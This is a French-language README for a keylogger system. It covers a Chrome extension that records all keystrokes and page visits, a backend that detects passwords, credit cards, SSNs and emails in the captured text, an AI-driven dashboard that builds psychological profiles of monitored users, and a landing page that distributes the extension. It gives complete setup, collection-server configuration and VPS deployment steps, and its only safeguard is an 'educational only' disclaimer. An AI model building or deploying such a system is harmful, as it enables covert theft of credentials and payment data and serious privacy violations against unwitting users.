# 🔐 Keylogger Extension - Système de Surveillance Intelligent

Système complet de monitoring et d'analyse comportementale avec IA intégrée (Azure OpenAI). Composé d'une extension Chrome, d'un backend Node.js, d'un dashboard React et d'une landing page.

## 📋 Table des matières

- [Architecture](#architecture)
- [Fonctionnalités](#fonctionnalités)
- [Prérequis](#prérequis)
- [Installation](#installation)
- [Configuration](#configuration)
- [Utilisation](#utilisation)
- [Déploiement](#déploiement)
- [API Documentation](#api-documentation)
- [Structure du projet](#structure-du-projet)

---

## 🏗️ Architecture

Le projet est divisé en 4 composants principaux :

```
┌─────────────────┐
│  Chrome         │
│  Extension      │──┐
└─────────────────┘  │
                     │
┌─────────────────┐  │    ┌──────────────────┐
│  Landing        │  │    │  Backend API     │
│  Page           │  ├───▶│  (Node.js)       │
│  (Port 3000)    │  │    │  + AI Analysis   │
└─────────────────┘  │    │  (Port 4000)     │
                     │    └──────────────────┘
┌─────────────────┐  │             │
│  Dashboard      │  │             │
│  React Admin    │──┘             │
│  (Port 5173)    │                │
└─────────────────┘                │
                                   ▼
                          ┌─────────────────┐
                          │  Azure OpenAI   │
                          │  (GPT-4)        │
                          └─────────────────┘
```

### Composants

1. **Extension Chrome** (`/extension`)
   - Capture les frappes clavier et visites de pages
   - Configuration serveur modifiable
   - Envoi des données au backend

2. **Backend API** (`/keylogger-server`)
   - API REST Node.js/Express
   - Stockage des données (JSON)
   - Analyse IA avec Azure OpenAI
   - Détection de données sensibles
   - Corrélation URL/données

3. **Dashboard Admin** (`/keylogger-server/dashboard`)
   - Interface React moderne (Vite + TypeScript)
   - Visualisation des utilisateurs et sessions
   - Analyse de profils utilisateur par IA
   - Graphiques et statistiques
   - Recherche et filtres
   - Groupement par site web

4. **Landing Page** (`/landing-page`)
   - Site vitrine professionnel
   - Téléchargement de l'extension (ZIP)
   - Design Apple-like

---

## ✨ Fonctionnalités

### 📊 Analytics & Monitoring
- Capture de toutes les frappes clavier
- Tracking des visites de pages
- Reconstruction du texte saisi
- Détection des champs de formulaire

### 🤖 Intelligence Artificielle
- **Génération de persona utilisateur** : Profil psychologique basé sur le comportement
- **Résumés de session** : Analyse automatique des sessions
- **Corrélation URL** : Détection de données critiques selon le contexte (banking, social, ecommerce)
- **Tendances globales** : Analyse comportementale générale

### 🔒 Sécurité & Détection
- **Détection de données sensibles** :
  - Mots de passe (champs password)
  - Emails
  - Cartes de crédit
  - Numéros de sécurité sociale (SSN)
  - Numéros de téléphone
- **Scoring de sensibilité** : Classification automatique (low/medium/high/critical)
- **Alertes de sécurité** : Mise en avant des sessions critiques

### 📈 Dashboard Features
- Vue liste des utilisateurs avec statistiques
- Profils utilisateurs détaillés
- Onglet "By Website" pour grouper par domaine
- Sessions expandables avec contenu des keylogs
- Graphiques de distribution des risques
- Recherche et filtrage temps réel

---

## 🔧 Prérequis

- **Node.js** >= 18.x
- **npm** >= 9.x
- **Docker** (optionnel, pour le déploiement)
- **Compte Azure OpenAI** (pour l'IA)
- **Navigateur Chrome** (pour l'extension)

---

## 📦 Installation

### 1. Cloner le projet

```bash
git clone <repository-url>
cd keylogger-extension
```

### 2. Installation du Backend

```bash
cd keylogger-server
npm install
```

### 3. Installation du Dashboard

```bash
cd keylogger-server/dashboard
npm install
```

### 4. Installation de la Landing Page

```bash
cd landing-page
npm install
```

---

## ⚙️ Configuration

### Backend - Variables d'environnement

Créer un fichier `.env` dans `/keylogger-server` :

```bash
cp keylogger-server/.env.example keylogger-server/.env
```

Éditer le fichier `.env` :

```env
# Azure OpenAI Configuration
AZURE_OPENAI_ENDPOINT=https://your-resource.cognitiveservices.azure.com/
AZURE_OPENAI_API_KEY=votre-clé-api-azure
AZURE_OPENAI_DEPLOYMENT=gpt-4
AZURE_OPENAI_API_VERSION=2024-02-15-preview

# Server Configuration
PORT=4000
NODE_ENV=development
```

### Obtenir vos credentials Azure OpenAI

1. Créer une ressource Azure OpenAI sur [portal.azure.com](https://portal.azure.com)
2. Déployer un modèle GPT-4 ou GPT-3.5
3. Récupérer :
   - L'endpoint : `Keys and Endpoint` → `Endpoint`
   - La clé API : `Keys and Endpoint` → `Key 1`
   - Le nom du déploiement : `Deployments` → nom de votre déploiement

### Extension Chrome - Configuration

Le fichier `extension/config.js` contient :

```javascript
const SERVER_CONFIG = {
    enabled: true,
    url: 'http://localhost:4000', // URL du backend
    endpoints: {
        keystroke: '/keystroke',
        pageVisit: '/page-visit'
    }
};
```

Pour changer l'URL du serveur :
- En développement : `http://localhost:4000`
- En production : `http://votre-domaine.com:40001`

### Dashboard - Configuration API

Le dashboard appelle automatiquement `http://localhost:4000` via le proxy Nginx en développement, ou `/api` en production.

---

## 🚀 Utilisation

### Développement Local

#### 1. Démarrer le Backend

```bash
cd keylogger-server
node server.js
```

Le serveur démarre sur `http://localhost:4000`

#### 2. Démarrer le Dashboard

```bash
cd keylogger-server/dashboard
npm run dev
```

Le dashboard est accessible sur `http://localhost:5173`

#### 3. Démarrer la Landing Page

```bash
cd landing-page
npm start
```

La landing page est sur `http://localhost:3000`

#### 4. Installer l'Extension Chrome

1. Ouvrir Chrome et aller à `chrome://extensions/`
2. Activer le "Mode développeur" (coin supérieur droit)
3. Cliquer sur "Charger l'extension non empaquetée"
4. Sélectionner le dossier `/extension`
5. L'extension est installée ! 🎉

### Production - Scripts Utiles

```bash
# Build toutes les images Docker
./build-and-push.sh

# Déployer sur VPS
./deploy-vps.sh

# Rebuild uniquement le backend
cd keylogger-server
docker build -t cyrilnkl/keylogger-backend:latest .

# Rebuild uniquement le dashboard
cd keylogger-server/dashboard
docker build -t cyrilnkl/keylogger-dashboard:latest .
```

---

## 🐳 Déploiement

### Docker Compose (Recommandé)

Le projet inclut un fichier `docker-compose.prod.yml` pour le déploiement.

```bash
# Build et push des images (avec votre Docker Hub username)
./build-and-push.sh

# Déployer sur VPS
./deploy-vps.sh
```

### Ports par défaut

- **Backend** : 40001 (production) / 4000 (dev)
- **Dashboard** : 40002 (production) / 5173 (dev)
- **Landing** : 40003 (production) / 3000 (dev)

### Configuration VPS

Modifier `deploy-vps.sh` avec votre IP :

```bash
VPS_USER="debian"
VPS_HOST="votre-ip-vps"
```

### Variables d'environnement Docker

Le fichier `docker-compose.prod.yml` contient déjà les configurations. Pour ajouter vos clés Azure :

```yaml
backend:
  environment:
    - NODE_ENV=production
    - PORT=4000
    - AZURE_OPENAI_ENDPOINT=https://...
    - AZURE_OPENAI_API_KEY=votre-clé
    - AZURE_OPENAI_DEPLOYMENT=gpt-4
    - AZURE_OPENAI_API_VERSION=2024-02-15-preview
```

---

## 📡 API Documentation

### Endpoints Backend

#### Données brutes

```http
POST /batch-data
Content-Type: application/json

{
  "userId": "user123",
  "sessions": [
    {
      "url": "https://example.com",
      "timestamp": "2025-11-21T10:00:00Z",
      "keystrokes": [...]
    }
  ]
}
```

#### Utilisateurs

```http
GET /api/users
Response: { users: [...], total: 10 }

GET /api/users/:userId
Response: { user details }
```

#### Statistiques

```http
GET /api/stats
Response: {
  totalUsers: 10,
  totalSessions: 100,
  totalKeystrokes: 5000,
  avgSessionDuration: 300,
  topDomains: [...]
}
```

#### Intelligence Artificielle

```http
# Analyser le profil d'un utilisateur
GET /api/ai/analyze-user/:userId
Response: {
  persona: "Description du profil...",
  cached: false
}

# Analyser une session
POST /api/ai/analyze-session
Body: { session: {...} }
Response: { summary: "..." }

# Corrélation URL
POST /api/ai/correlate-url
Body: { session: {...} }
Response: {
  siteType: "banking",
  detectedData: ["credentials", "payment"],
  shouldHighlight: true,
  concerns: [...],
  recommendations: [...]
}

# Résumé de session
GET /api/ai/session-summary/:userId/:sessionId

# Tendances globales
GET /api/ai/global-trends

# Alertes de sécurité
GET /api/ai/security-alerts
```

---

## 📁 Structure du projet

```
keylogger-extension/
├── extension/                    # Extension Chrome
│   ├── manifest.json            # Configuration extension
│   ├── background.js            # Service worker
│   ├── content.js               # Script de capture
│   ├── config.js                # Configuration serveur
│   ├── popup.html/js/css        # Interface popup
│   └── README.md
│
├── keylogger-server/            # Backend Node.js
│   ├── server.js                # Serveur Express
│   ├── ai-analysis.js           # Module Azure OpenAI
│   ├── package.json
│   ├── .env.example             # Template variables env
│   ├── Dockerfile
│   ├── data/                    # Base de données JSON
│   │   ├── users.json
│   │   └── ai-cache.json
│   ├── logs/                    # Logs des sessions
│   └── dashboard/               # Dashboard React
│       ├── src/
│       │   ├── App.tsx
│       │   ├── components/
│       │   │   ├── UsersList.tsx
│       │   │   ├── UserProfile.tsx
│       │   │   ├── StatsCards.tsx
│       │   │   ├── KeylogsViewer.tsx
│       │   │   └── SeverityChart.tsx
│       │   └── lib/
│       ├── package.json
│       ├── vite.config.ts
│       ├── tailwind.config.js
│       └── Dockerfile
│
├── landing-page/                # Site vitrine
│   ├── server.js                # Serveur Express
│   ├── index.html               # Page d'accueil
│   ├── styles.css               # Styles
│   ├── package.json
│   └── Dockerfile
│
├── docker-compose.prod.yml      # Configuration Docker
├── build-and-push.sh           # Script build images
├── deploy-vps.sh               # Script déploiement VPS
├── .gitignore
└── README.md                    # Ce fichier
```

---

## 🔐 Sécurité & Légalité

⚠️ **IMPORTANT** : Ce projet est destiné à des fins éducatives uniquement.

### Avertissements

- ❌ **Ne jamais utiliser** sans le consentement explicite des utilisateurs
- ❌ **Illégal** dans la plupart des juridictions sans autorisation
- ❌ **Violation de la vie privée** si utilisé à mauvais escient
- ✅ Utiliser uniquement dans un cadre pédagogique ou de recherche
- ✅ Toujours obtenir l'autorisation écrite avant tout déploiement

### Bonnes pratiques

1. **Ne jamais stocker** de vraies données sensibles
2. **Chiffrer** les communications en production (HTTPS)
3. **Anonymiser** les données utilisateur
4. **Respecter** le RGPD et lois sur la protection des données
5. **Documenter** l'usage et obtenir les consentements

---

## 🛠️ Développement

### Technologies utilisées

**Backend**
- Node.js 20
- Express.js
- Axios (Azure OpenAI)
- Archiver (ZIP files)

**Frontend Dashboard**
- React 19
- TypeScript
- Vite 7
- Tailwind CSS 3
- Shadcn/UI
- Recharts (graphiques)
- Framer Motion (animations)

**Extension**
- Vanilla JavaScript
- Chrome Extension Manifest V3

**Déploiement**
- Docker & Docker Compose
- Nginx (reverse proxy)
- Alpine Linux (images légères)

### Scripts npm disponibles

```bash
# Backend
cd keylogger-server
npm start              # Démarrer le serveur

# Dashboard
cd keylogger-server/dashboard
npm run dev            # Développement
npm run build          # Build production
npm run preview        # Preview build

# Landing
cd landing-page
npm start              # Démarrer serveur
```

---

## 🐛 Troubleshooting

### Le backend ne démarre pas

```bash
# Vérifier que le port 4000 est libre
lsof -ti:4000 | xargs kill -9

# Vérifier les variables d'environnement
cat keylogger-server/.env

# Vérifier les logs
cd keylogger-server
node server.js
```

### L'extension ne se connecte pas

1. Vérifier que le backend tourne sur `http://localhost:4000`
2. Vérifier `extension/config.js` → `url` doit être `http://localhost:4000`
3. Ouvrir la console de l'extension : `chrome://extensions` → "Inspecter les vues"
4. Vérifier les requêtes réseau dans DevTools

### Le dashboard affiche "No users"

1. L'extension doit être active et capturer des données
2. Naviguer sur des sites web avec l'extension activée
3. Vérifier `/keylogger-server/data/users.json` contient des données
4. Rafraîchir le dashboard

### Docker : erreur "no matching manifest"

```bash
# Rebuilder avec la bonne architecture
docker buildx build --platform linux/amd64 -t image:latest --push .
```

### Azure OpenAI : erreur 401/403

- Vérifier que la clé API est correcte dans `.env`
- Vérifier que l'endpoint est le bon
- Vérifier que le déploiement existe dans Azure

---

## 📝 License

Ce projet est sous licence MIT. Voir le fichier LICENSE pour plus de détails.

---

## 👥 Contribution

Les contributions sont les bienvenues ! N'hésitez pas à :

1. Fork le projet
2. Créer une branche (`git checkout -b feature/AmazingFeature`)
3. Commit vos changements (`git commit -m 'Add AmazingFeature'`)
4. Push vers la branche (`git push origin feature/AmazingFeature`)
5. Ouvrir une Pull Request

---

## 📞 Support

Pour toute question ou problème :

- Ouvrir une issue sur GitHub
- Consulter la documentation Azure OpenAI
- Vérifier les logs du backend/dashboard

---

## 🎯 Roadmap

- [ ] Support PostgreSQL/MongoDB
- [ ] Authentification utilisateurs
- [ ] Export de rapports PDF
- [ ] Support multi-langues
- [ ] Mode hors ligne
- [ ] Chiffrement end-to-end
- [ ] Tests unitaires et E2E
- [ ] CI/CD avec GitHub Actions
- [ ] Documentation API Swagger
- [ ] Dashboard mobile responsive

---

**⚠️ Rappel** : Ce projet est à des fins éducatives. Utilisez-le de manière responsable et éthique.
